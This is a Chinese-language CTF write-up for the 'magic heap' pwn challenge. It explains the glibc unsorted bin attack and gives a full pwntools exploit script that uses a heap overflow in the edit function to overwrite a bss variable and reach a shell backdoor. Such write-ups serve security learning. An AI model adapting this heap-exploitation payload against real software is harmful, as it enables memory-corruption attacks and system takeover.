---
title: magic heap
date: 2023-01-02 19:54:26
categories: 
- pwn_wp
tags: 
- pwn
- heap

---

一道unsorted bin attack的题目，利用unsorted bin attack修改值来绕过if条件

<!-- more -->

**unsorted bin attack**

查壳，64位，保护几乎全开。

一道菜单题，在edit函数中没有限制写入的size，存在堆溢出。133t函数是个后门函数，需要修改bss段的magic>0x1305后，选择4869进入，即可get shell。

原本以为是利用fast bin attack将magic所在的内存malloc出来，然后通过edit函数修改magic的值。后来发现不能malloc出来，调试的时候发现报错说指针非法。

后来看到是使用**unsorted bin attack**，unsorted bin attack可以将一个地址的值写为一个**非常大**的数，可以满足题目的需求。

unsorted bin attack原理：

在unsorted bin中，遵循FIFO的原则，free chunk采用双向链表连接。当从unsorted bin中取出chunk时，会从unsorted bin的末尾取出，在取出的过程中会执行bk->fd=unsorted_bin(av)，通过bk找到前一个chunk，将前一个chunk的fd指向unsorted bin的头结点。

如果通过一些方法（如堆溢出），可以控制取出chunk的bk指针，那么就可以将*bk+0x10的位置修改为unsorted bin头结点的地址，这个地址的值是很大的。

exp:

```python
from pwn import*
elf=ELF("./magicheap2")
p=process("./magicheap2")
#p=remote()
context.log_level='debug'
magic=0x6020A0

def create(size,content):
    p.recv()
    p.sendline('1')
    p.recvuntil("Size of Heap : ")
    p.sendline(str(size))
    p.recvuntil("Content of heap:")
    p.sendline(content)
    p.recvuntil("SuccessFul")

def edit(idx,size,content):
    p.recv()
    p.sendline('2')
    p.recvuntil("Index :")
    p.sendline(str(idx))
    p.recvuntil("Size of Heap : ")
    p.sendline(str(size))
    p.recvuntil("Content of heap : ")
    p.sendline(content)
    p.recvuntil("Done !")

def delete(idx):
    p.recv()
    p.sendline('3')
    p.recvuntil("Index :")
    p.sendline(str(idx))
    p.recvuntil("Done !")

def get_shell():
    p.recv()
    p.sendline('4869')
    p.recv()
    p.interactive()

fake_chunk=0x60207d

create(0x20,'chunk0')
create(0x80,'chunk1')
create(0x20,'chunk2')
delete(1)
payload='a'*0x20+p64(0)+p64(0x91)+p64(0)+p64(magic-0x10)
#gdb.attach(p)
edit(0,0x40,payload)
create(0x80,'chunk1')
get_shell()

```